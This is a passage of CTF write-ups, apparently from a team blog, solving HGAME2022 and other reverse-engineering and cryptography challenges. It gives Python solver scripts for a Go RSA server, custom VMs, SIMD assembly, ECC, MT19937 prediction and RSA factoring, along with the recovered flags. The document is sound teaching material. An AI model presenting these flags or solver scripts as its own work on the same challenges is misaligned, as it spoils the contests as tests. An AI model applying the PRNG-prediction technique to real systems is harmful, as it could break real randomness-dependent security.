2,13, 1,10, 6,12,11, 9, 5, 3, 8, 4, 1,14, 8,13, 6, 2,11,15,12, 9, 7, 3,10, 5, 0, 15,12, 8, 2, 4, 9, 1, 7, 5,11, 3,14,10, 0, 6,13, //S2 \t15, 1, 8,14, 6,11, 3, 4, 9, 7, 2,13,12, 0, 5,10, 3,13, 4, 7,15, 2, 8,14,12, 0, 1,10, 6, 9,11, 5, 0,14, 7,11,10, 4,13, 1, 5, 8,12, 6, 9, 3, 2,15, 13, 8,10, 1, 3,15, 4, 2,11, 6, 7,12, 0, 5,14, 9, //S3 \t10, 0, 9,14, 6, 3,15, 5, 1,13,12, 7,11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6,10, 2, 8, 5,14,12,11,15, 1, 13, 6, 4, 9, 8,15, 3, 0,11, 1, 2,12, 5,10,14, 7, 1,10,13, 0, 6, 9, 8, 7, 4,15,14, 3,11, 5, 2,12, //S4 \t7,13,14, 3, 0, 6, 9,10, 1, 2, 8, 5,11,12, 4,15, 13, 8,11, 5, 6,15, 0, 3, 4, 7, 2,12, 1,10,14, 9, 10, 6, 9, 0,12,11, 7,13,15, 1, 3,14, 5, 2, 8, 4, 3,15, 0, 6,10, 1,13, 8, 9, 4, 5,11,12, 7, 2,14, //S5 \t2,12, 4, 1, 7,10,11, 6, 8, 5, 3,15,13, 0,14, 9, 14,11, 2,12, 4, 7,13, 1, 5, 0,15,10, 3, 9, 8, 6, 4, 2, 1,11,10,13, 7, 8,15, 9,12, 5, 6, 3, 0,14, 11, 8,12, 7, 1,14, 2,13, 6,15, 0, 9,10, 4, 5, 3, //S6 \t12, 1,10,15, 9, 2, 6, 8, 0,13, 3, 4,14, 7, 5,11, 10,15, 4, 2, 7,12, 9, 5, 6, 1,13,14, 0,11, 3, 8, 9,14,15, 5, 2, 8,12, 3, 7, 0, 4,10, 1,13,11, 6, 4, 3, 2,12, 9, 5,15,10,11,14, 1, 7, 6, 0, 8,13, //S7 \t4,11, 2,14,15, 0, 8,13, 3,12, 9, 7, 5,10, 6, 1, 13, 0,11, 7, 4, 9, 1,10,14, 3, 5,12, 2,15, 8, 6, 1, 4,11,13,12, 3, 7,14,10,15, 6, 8, 0, 5, 9, 2, 6,11,13, 8, 1, 4,10, 7, 9, 5, 0,15,14, 2, 3,12, //S8 \t13, 2, 8, 4, 6,15,11, 1,10, 9, 3,14, 5, 0,12, 7, 1,15,13, 8,10, 3, 7, 4,12, 5, 6,11, 0,14, 9, 2, 7,11, 4, 1, 9,12,14, 2, 0, 6,10,13,15, 3, 5, 8, 2, 1,14, 7, 4,10, 8,13,15,12, 9, 0, 3, 5, 6,11 }; static char P_Table[32]={ 16, 7,20,21,29,12,28,17, 1,15,23,26, 5,18,31,10, 2, 8,24,14,32,27, 3, 9,19,13,30, 6,22,11, 4,25 }; static bool SubKey[16][48]={ 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0 }; #endif [RE]server  By s0uthwood\n 下断点，浏览器输入 localhost:9090?flag=hgame{} 就能断住，然后就是慢慢调试了\nrsa 部分用的 math/big 库中的东西，还是比较容易识别的（go 还是看汇编舒服）\n随后就是两个循环的异或了，这里用 z3 解的，所以逻辑直接看代码就行\nfrom libnum import * from z3 import * flag = [BitVec(\u0026#39;f%i\u0026#39; % i, 8) for i in range(153)] s = Solver() c = 0x66 flag2 = [] for i in range(153): v16 = flag[i] flag2.append(v16 ^ c) c = v16 for i in range(153): v18 = flag2[i] flag2[i] = v18 ^ c c = v18 cipher = [ 99, 85, 4, 3, 5, 5, 5, 3, 7, 7, 2, 8, 8, 11, 1, 2, 10, 4, 2, 13, 8, 9, 12, 9, 4, 13, 8, 0, 14, 0, 15, 13, 14, 10, 2, 2, 1, 7, 3, 5, 6, 4, 6, 7, 6, 2, 2, 5, 3, 3, 9, 6, 0, 11, 13, 11, 0, 2, 3, 8, 3, 11, 7, 1, 11, 5, 14, 5, 0, 10, 14, 15, 13, 7, 13, 7, 14, 1, 15, 1, 11, 5, 6, 2, 12, 6, 10, 4, 1, 7, 4, 2, 6, 3, 6, 12, 5, 12, 3, 12, 6, 0, 4, 15, 2, 14, 7, 0, 14, 14, 12, 4, 3, 4, 2, 0, 0, 2, 6, 2, 3, 6, 4, 4, 4, 7, 1, 2, 3, 9, 2, 12, 8, 1, 12, 3, 12, 2, 0, 3, 14, 3, 14, 12, 9, 1, 7, 15, 5, 7, 2, 2, 4 ] for i in range(153): s.add(flag2[i] == cipher[i]) for i in range(153): s.add(flag[i] \u0026gt;= ord(\u0026#39;0\u0026#39;)) s.add(flag[i] \u0026lt;= ord(\u0026#39;9\u0026#39;)) s.check() m = s.model() for i in flag: print (chr(m[i].as_long()), end=\u0026#39;\u0026#39;) # 135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024 M = 92582184765240663364795767694262273105045150785272129481762171937885924776597 N = 107310528658039985708896636559112400334262005367649176746429531274300859498993 t = M * N e = 950501 phi = (M - 1) * (N - 1) n2s(pow(135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024, invmod(e, phi), t)) # b\u0026#39;hgame{g0_and_g0_http_5erv3r_nb}\u0026#39; [RE]ezvm  By s0uthwood\n 把几个指令整理一下\n能够看出特定用途的几个寄存器：\n[8]: ZF 相等为 0，大于为 1，小于为 -1 [9]: stack [9 + 100]: code [9 + 200]: data\n其他的应该都是 rax 之类的\n总结的几个指令：\n   op disasm     0 mov r3, r2   1 inc r2   2 dec r2   3 xor r3, r7   4 push r3   5 push r5   6 push r6   7 pop r3   8 pop r5   9 pop r6   10 pop r2   11 pop r7   12 jz $+1+r6   13 jnz $+1+r6   14 jmp $+1+r2   15 cmp r3, r5   16 getchar(r3)   17 putchar(r3)   18 push *((r4++)+0xD1)   19 mov r3, [rbp+r2]   20 mov [rbp+r2], r3   21 add r3, r3    接下来就是反汇编了\ncode = [ 0x12, 8, 0x12, 9, 0x10, 4, 1, 0x0F, 0x0D, 2, 0x12, 8, 0x12, 9, 0, 4, 0x0F, 0x0D, 0x12, 9, 0x12, 0x0A, 0x13, 0x12, 0x0B, 0x15, 3, 0x14, 1, 0, 0x0F, 0x0D, 0x12, 0x0A, 0x12, 0x12, 0x12, 8, 0x13, 0x0F, 7, 4, 9, 0x0D, 9, 8, 5, 6, 4, 1, 0, 0x0F, 0x0D, 0x12, 9, 0x12, 8, 0x12, 0x0A, 0x12, 7, 0x0F, 0x0C, 0x11, 0x0E ] def disasm(i, c): if c == 0: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [3], [2]\u0026#34;) elif c == 1: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;inc [2]\u0026#34;) elif c == 2: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;dec [2]\u0026#34;) elif c == 3: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;xor [3], [7]\u0026#34;) elif c == 4: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [3]\u0026#34;) elif c == 5: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [5]\u0026#34;) elif c == 6: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [6]\u0026#34;) elif c == 7: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [3]\u0026#34;) elif c == 8: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [5]\u0026#34;) elif c == 9: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [6]\u0026#34;) elif c == 10: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [2]\u0026#34;) elif c == 11: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [7]\u0026#34;) elif c == 12: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jz $+1+[6]\u0026#34;) elif c == 13: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jnz $+1+[6]\u0026#34;) elif c == 14: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jmp $+1+[2]\u0026#34;) elif c == 15: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;cmp [3], [5]\u0026#34;) elif c == 16: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;getchar([3])\u0026#34;) elif c == 17: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;putchar([3])\u0026#34;) elif c == 18: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push *(([4]++)+0xD1)\u0026#34;) elif c == 19: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [3], [rbp+[2]]\u0026#34;) elif c == 20: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [rbp+[2]], [3]\u0026#34;) elif c == 21: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;add [3], [3]\u0026#34;) 也许跟着 log 一起看比较好，这里就直接对着 data 里的数据看了\n_00: push 0x0A\r_01: pop [5]\r_02: push -5\r_03: pop [6]\r_04: getchar([3])\r_05: push [3]\r_06: inc [2]\r_07: cmp [3], [5]\r_08: jnz $+1+[6]\r_09: dec [2]\r这个 jnz 的循环是 getchar() 直到读取到 \\n\n接下来是个对长度做了限制\n_0A: push 0x20\r_0B: pop [5]\r_0C: push 0x2F\r_0D: pop [6]\r_0E: mov [3], [2]\r_0F: push [3]\r_10: cmp [3], [5]\r_11: jnz $+1+[6]\r这里先 add 自身，然后依次异或 data 中的数据（第一个是 0x5e）\n_12: push -10\r_13: pop [6]\r_14: push 0\r_15: pop [2]\r_16: mov [3], [rbp+[2]]\r_17: push 0x5e (next_mem)\r_18: pop [7]\r_19: add [3], [3]\r_1A: xor [3], [7]\r_1B: mov [rbp+[2]], [3]\r_1C: inc [2]\r_1D: mov [3], [2]\r_1E: cmp [3], [5]\r_1F: jnz $+1+[6]\r后面就是比较了，如果不相等就会直接从第一个 jnz 直接退出，否则会判断长度来看是否退出循环\n_20: push *(([4]++)+0xD1) ; 0\r_21: pop [2]\r_22: push *(([4]++)+0xD1) ; -17\r_23: push *(([4]++)+0xD1) ; 21\r_24: push *(([4]++)+0xD1) ; 142\r_25: pop [5] ; [5] = 142\r_26: mov [3], [rbp+[2]] ; [3]=142\r_27: cmp [3], [5] ; 0\r_28: pop [3]\r_29: push [3]\r_2A: pop [6] ; 21\r_2B: jnz $+1+[6]\r_2C: pop [6] ; -17\r_2D: pop [5]\r_2E: push [5]\r_2F: push [6]\r_30: push [3]\r_31: inc [2]\r_32: mov [3], [2]\r_33: cmp [3], [5]\r_34: jnz $+1+[6]\r最后一段没有看了，putchar() 显然是输出正确信息\n脚本\nfrom operator import xor xor_list = [0x5E, 0x46, 0x61, 0x43, 0x0E, 0x53, 0x49, 0x1F, 0x51, 0x5E, 0x36, 0x37, 0x29, 0x41, 0x63, 0x3B, 0x64, 0x3B, 0x15, 0x18, 0x5B, 0x3E, 0x22, 0x50, 0x46, 0x5E, 0x35, 0x4E, 0x43, 0x23, 0x60, 0x3B] cipher = [0x8E, 0x88, 0x0A3, 0x99, 0x0C4, 0x0A5, 0x0C3, 0x0DD, 0x19, 0x0EC, 0x6C, 0x9B, 0x0F3, 0x1B, 0x8B, 0x5B, 0x3E, 0x9B, 0x0F1, 0x86, 0x0F3, 0x0F4, 0x0A4, 0x0F8, 0x0F8, 0x98, 0x0AB, 0x86, 0x89, 0x61, 0x22, 0xC1] for x, c in zip(xor_list, cipher): print (chr((c ^ x) // 2), end=\u0026#39;\u0026#39;) # hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!} [RE]hardasm  By s0uthwood\n 全是 simd，反着执行回去就行，或者可以试试正着用 z3 解\n这个脚本因为有些指令的某一个参数是不变的（比如 vpermd ymmX, ymm7, ymmX），所以偷懒了\nasm = \u0026#39;\u0026#39;\u0026#39;\\ vpermd ymm4, ymm7, ymm4 ... vpermd ymm1, ymm7, ymm1\u0026#39;\u0026#39;\u0026#39; ymm0 = b\u0026#39;\\x93\\xcb\\xe7\\x93\\xa9\\x81\\r\\xb6\\xd8\\xdd\\x9c\\x7f\\xc0M\\xcd\\xf0\\x00\\xa0\\x9f\u0026#34;\\x89\\xefT]\\xef\\x00\\x8d\\xfe^L\\xd0\\xec\u0026#39; ymm1 = b\u0026#39;i\\xcf\\x8e\\xb3\\xf8\\x98\\x90\\x0b\\\\\u0026amp;}\\xcf\\x8c$\\x1d\\x96s\\x8b\\xc7\\xaa\\xfc\\xaf\\xfd\\x91F3e\\xb8#z\\xcd\\xa5\u0026#39; ymm2 = b\u0026#34;\\xff\\x83\\xf3\\xdf\\xec\\x00\\x8e\\x92OL\\x97O\u0026#39;D\\x7f\\xa4\\xe3N\\xbf$d\\xdd*T\\xc3i\\xb2\\x82q\\xa0\\x1b\\xf5\u0026#34; ymm3 = b\u0026#39;\\xb4\\xc7lj\\xfb\\x1fp\\xf5}\\xc9\\r\\x1b\\xb4\\xe5\\xffEN^\\x95]\\xef\\x8e@\\x8d\\x9a\\xf9\\xd1\\x92\\x8b\\xbf}\\xbb\u0026#39; ymm4 = b\u0026#39;\\xca}6\\xf7\\xc5\\xcb\\x90\\xb9B\\x96\\xe0\\xa55sL\\xf7\\xa9\\x9d\\x87\\xa1\\xc2r\\x8b\\xe8\\x9af\\t*\\xe6%\\x04\\xd1\u0026#39; ymm5 = b\u0026#39;)\\x9d\\x0bGy\\x1a\\xa4\\x97\\x02\\xbf\\x13\\x9e\\xa0\\xd2\\xa4m?_=M4\\xea\\xeeRa\\x97e\\xb4\\x04\\x91\\xd8W\u0026#39; ymm6 = b\u0026#39;\\x00\\x01\\x08\\t\\n\\x02\\x03\\x04\\x05\\x0c\\r\\x0e\\x06\\x07\\x0b\\x0f\\x00\\x06\\x07\\x08\\t\\n\\x02\\x03\\x04\\x05\\r\\x0e\\x0b\\x0c\\x01\\x0f\u0026#39; ymm7 = b\u0026#39;\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x07\\x00\\x00\\x00\u0026#39; def rev_vpermd(x, y): \u0026#34;\u0026#34;\u0026#34; origin: from: b\u0026#34;3_bh\u0026#34; b\u0026#34;\\rd\\xa8\\xff\\x8f\\x99\\xa7\\x94\\x9e\\x9a)4\u0026#34; b\u0026#34;\u0026#39;6\\xd6\\x82\\xc2m\\xe8\\xaa\u0026#34; b\u0026#34;\\x96Je\\xc0\\x0c7\\x19\\xc9\u0026#34; to : b\u0026#34;3_bh\u0026#34; b\u0026#34;\u0026#39;6\\xd6\\x82\\xc2m\\xe8\\xaa\u0026#34; b\u0026#34;\\rd\\xa8\\xff\\x8f\\x99\\xa7\\x94\\x9e\\x9a)4\u0026#34; b\u0026#34;\\x96Je\\xc0\\x0c7\\x19\\xc9\u0026#34; \u0026#34;\u0026#34;\u0026#34; return y[:4] + y[12:24] + y[4:12] + y[24:] def rev_vpxor(x, y): return bytes([a ^ b for a, b in zip(x, y)]) def rev_vpaddb(x, y): return bytes([(a - b) \u0026amp; 0xff for a, b in zip(x, y)]) def rev_vpsubb(x, y): return bytes([(a + b) \u0026amp; 0xff for a, b in zip(x, y)]) def rev_vpshufb(x, y): \u0026#34;\u0026#34;\u0026#34; origin: from: b\u0026#39;\\x89\\xa1\u0026#39; b\u0026#39;\u0026gt;\\xc0\\xe5\\x14\u0026#39; \u0026#39;_\\xc5\u0026#39; \u0026#39;_\\x14\\xb0\u0026#39; \u0026#39;\\xd0\u0026#39; \u0026#39;%\\x1f\\xe8\u0026#39; \u0026#39;\\xf5\\xb0\u0026#39; \u0026#39;4\u0026#39; \u0026#39;6\\xc2\\xc7\\xa0\u0026#39; \u0026#39;\\xb2\u0026lt;^~\\x9c\u0026#39; \u0026#39;\\xa4\\x98\u0026#39; \u0026#39;\\xe8T\u0026#39; \u0026#39;\\x0b\u0026#39; to : b\u0026#39;\\x89\\xa1\u0026#39; b\u0026#39;_\\x14\\xb0\u0026#39; \u0026#39;\u0026gt;\\xc0\\xe5\\x14\u0026#39; \u0026#39;%\\x1f\\xe8\u0026#39; \u0026#39;_\\xc5\u0026#39; \u0026#39;\\xd0\u0026#39; \u0026#39;\\xf5\\xb0\u0026#39; \u0026#39;\\xb2\u0026lt;^~\\x9c\u0026#39; \u0026#39;6\\xc2\\xc7\\xa0\u0026#39; \u0026#39;\\xe8T\u0026#39; \u0026#39;\\xa4\\x98\u0026#39; \u0026#39;4\u0026#39; \u0026#39;\\x0b\u0026#39; \u0026#34;\u0026#34;\u0026#34; return x[:2] + x[5:9] + x[12:14] + x[2:5] + x[14:15] + x[9:12] + x[15:17]+ x[30:31] + x[22:26] + x[17:22] + x[28:30] + x[26:28] + x[31:] for a in asm.split(\u0026#39;\\n\u0026#39;)[::-1]: b = a.replace(\u0026#39;,\u0026#39;, \u0026#39;\u0026#39;).split() exec(f\u0026#39;{b[1]}= rev_{b[0]}({b[2]}, {b[3]})\u0026#39;) print (ymm0)  ida 动调的时候要知道寄存器的值，可以用 idapython 的 get_reg_value(\u0026quot;ymm0\u0026quot;) 指令不知道什么意思的话动调看一下变化就行\n [Crypto]ECC  By NULLPointer\n 传统的椭圆曲线加密，利用 sage 工具求解即可。\np = 74997021559434065975272431626618720725838473091721936616560359000648651891507 a = 61739043730332859978236469007948666997510544212362386629062032094925353519657 b = 87821782818477817609882526316479721490919815013668096771992360002467657827319 k = 93653874272176107584459982058527081604083871182797816204772644509623271061231 E = EllipticCurve(GF(p), [a, b]) #建立椭圆曲线E c1 = E(14455613666211899576018835165132438102011988264607146511938249744871964946084, 25506582570581289714612640493258299813803157561796247330693768146763035791942) c2 = E(37554871162619456709183509122673929636457622251880199235054734523782483869931, 71392055540616736539267960989304287083629288530398474590782366384873814477806) m = c1 - k * c2 # \u0026#34;m = (57824879640955326550732559538097319221644125075532201058220628014917816573008 : 54475275866179647254036565579467398677511796158866832907668620448532510526757 : 1)\u0026#34; from libnum import invmod,n2s m = [57824879640955326550732559538097319221644125075532201058220628014917816573008,54475275866179647254036565579467398677511796158866832907668620448532510526757] cipher_left = 68208062402162616009217039034331142786282678107650228761709584478779998734710 cipher_right = 27453988545002384546706933590432585006240439443312571008791835203660152890619 d1 = invmod(m[0],p) d2 = invmod(m[1],p) flag = n2s(pow(cipher_left*d1,1,p)) + n2s(pow(cipher_right*d2,1,p)) print(flag) # \u0026#34;hgame{ECC$is!sO@HaRd}\u0026#34; [Crypto]PRNG  By NULLPointer\n 解压得到 output.txt 和 task.py，先分析加密代码：\nmt = PRNG(randrange(0, 1 \u0026lt;\u0026lt; 32)) # 在0到2^32-1之间建立伪随机数生成器 print([mt() for _ in range(624)]) # 利用伪随机数生成器生成624个伪随机数写入列表 print([part ^ mt() for part in map(s2n, re.findall(\u0026#34;.{1,4}\u0026#34;, flag))]) # 将flag每四个字符分成一组得到多组字符串，转成整数后对每一组字符串生成一个伪随机数并异或处理，写入列表 由 MT 和 624 等关键词可知考察的是 PRNG 中的伪随机数生成算法 MT19937。MT19937 是一种周期很长的的伪随机数生成算法，可以快速的产生高质量的伪随机数。然而，由于 MT 中伪随机数是由固定的种子数生成的，因此如果获得了算法中种子数的统计规律，便可以利用其规律和已知的伪随机数序列推测算法生成的下一个伪随机数。在 MT 算法中，一般得到 624 个伪随机数即可进行预测。\ngithub 上基于 python 的开源工具 rankcrack 可以预测伪随机数序列。利用该工具编写预测脚本如下：\nfrom randcrack import RandCrack # data = [...] 题目中已给出 Rand = RandCrack() assert(len(data) \u0026gt;= 624) for i in range(624): Rand.submit(data[i]) for i in range(624, len(data)): Rand.predict_randrange(0,0xffffffff) print(Rand.predict_randrange(0,0xffffffff)) 脚本的使用方法为：将已知的伪随机数序列 data 放入程序，程序会根据已知序列预测MT算法产生的下一个伪随机数。将预测得到的伪随机数放入 data 末尾，重新运行程序即可获得下一个伪随机数。重复执行以上步骤直至获得足够长的伪随机数序列。\n密文列表中共有 21 个元素，因此利用以上预测脚本预测接下来生成的 21 个伪随机数。最后将对应位置的密文和伪随机数异或即可得到明文。解密脚本如下：\ndata = [ 888058162, 3094055443, # 中间省略 1699850772, 1444384326 ] c = [ 3437104340, 508103176, 1635844121, 878522509, 1923790547, 1727955782, 1371509208, 3182873539, 156878129, 1757777801, 1472806960, 3486450735, 2307527058, 2950814692, 1817110380, 372493821, 729662950, 2366747255, 774823385, 387513980, 1444397883 ] from libnum import n2s for i in range(624,646): print(n2s(c[i-624]^data[i])) # hgame{meRsenne!tWisTER~iS^A*WIDelY-USEd^pSEUDo\u0026amp;rAndOM:nUmBEr!GeNErATIon?AlgorIThM} ","date":"2022-02-25T22:32:31+08:00","permalink":"https://or4ngesec.github.io/post/hgame2022-writeup-by-or4nge/","title":"HGAME2022 Writeup by or4nge"},{"content":"RE babyVM 将花指令patch掉\n\r\n\r\n将patch好的应用到文件。\n\r\n能看出来是个虚拟机逆向题\n\r\n动态调试的过程中可以看到程序向内存里写了一段数据\n0xFF,0x223,0x23B,0x237,0x237,0x24B,0x22B,0xFB,0x22B,0x223,0x24F,0xEF,0x237,0xEF,0x24F,0x24F,0x223,0x223,0x23B,0x237,0xFF,0x233,0x233,0x233,0x237,0x24B,0x233,0x24F,0x22B,0x22B,0x24B,0xEF\r\r\n这个部分把上述数据每一个都减了0x63\n程序获得用户的输入\n\r\n比较的过程中可以发现，用户输入的长度应该是0x26\n\r\n并且在后面比较的过程中，flag{}这几个字符占了6个。\n再向后跟踪的过程中发现\n\r\n用户的输入和0x42做了异或\n\r\n再把结果左移两位，和前面的数据做了比较，因此最后的exp是：\ndump = [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140] for i in range(len(dump)): print(chr((dump[i]\u0026gt;\u0026gt;2)^0x42),end=\u0026#39;\u0026#39;) print() # e247780d029a7a992247e6667869008a EasyVM \r\n和上题一样，去除应该应该去除的花指令。\n\r\n然后引发了一个异常\n观察异常处理函数\n\r\n看到输入的长度为42\n\r\n在这个函数里面输入经过了base64编码，而且和0xa,0xb,0xc,0xd异或\n\r\n然后根据函数地址表进行虚拟机逻辑。\n\r\n动态调试中可以发现函数将输入经过特制变换的 base64 和前一个结果异或，和 0xee 异或，再进行比较，然后动态调试的过程中把最终的结果提取出来，可以写出脚本。\nimport base64 dump = [0x00,0xBE, 0x36, 0xAC, 0x27, 0x99, 0x4F, 0xDE, 0x44, 0xEE, 0x5F, 0xDA, 0x0B, 0xB5, 0x17, 0xB8, 0x68, 0xC2, 0x4E, 0x9C, 0x4A, 0xE1, 0x43, 0xF0, 0x22, 0x8A, 0x3B, 0x88, 0x5B, 0xE5, 0x54, 0xFF, 0x68, 0xD5, 0x67, 0xD4, 0x06, 0xAD, 0x0B, 0xD8, 0x50, 0xF9, 0x58, 0xE0, 0x6F, 0xC5, 0x4A, 0xFD, 0x2F, 0x84, 0x36, 0x85, 0x52, 0xFB, 0x73, 0xD7, 0x0D, 0xE3] x = [0xa,0xb,0xc,0xd] dump = dump[::-1] dump1 = [] for i in range(1,len(dump)): dump1.append(dump[i]^dump[i-1]^0xee) dump1 = dump1[::-1] dump2 = [] for i in range(len(dump1)): dump2.append((dump1[i]^x[(i)%4]).to_bytes(1,byteorder=\u0026#39;big\u0026#39;)) print (base64.b64decode(b\u0026#39;\u0026#39;.join(dump2))) # b\u0026#39;flag{2586dc76-98d5-44e2-ad58-d06e6559d82a}\u0026#39; Crypto babyrsa 把 n 扔到 factordb 上直接分解了出来，拿到 pq，直接解密就行\nfrom libnum import n2s def exgcd(a, b): if b == 0: return 1, 0, a else: x, y, q = exgcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q p = 98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033 q = 133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513 N = 13123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929 assert p * q == N e = 2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877 flag = 